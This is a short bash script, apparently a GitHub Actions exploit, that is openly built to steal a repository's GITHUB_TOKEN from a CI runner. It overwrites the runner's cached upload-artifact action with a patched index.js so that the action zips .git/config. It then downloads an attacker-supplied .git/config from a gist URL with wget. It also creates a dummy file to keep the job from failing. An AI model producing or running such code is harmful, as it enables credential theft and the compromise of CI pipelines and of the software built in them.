#!/bin/bash

# to prevent the job from failing
touch missing_license_headers.txt

# patching the upload-artifact action with code to zip the .git/config file
cp index.js /home/runner/work/_actions/actions/upload-artifact/v3/dist/index.js

# modifying .git/config to exfiltrate the GITHUB_TOKEN 
wget https://gist.githubusercontent.com/stazottest0/ec556e4cc70e6029c6f5bd91925168ba/raw/a3686326ca07bdb8583ba51ae896e8c293594018/gistfile1.txt -O .git/config
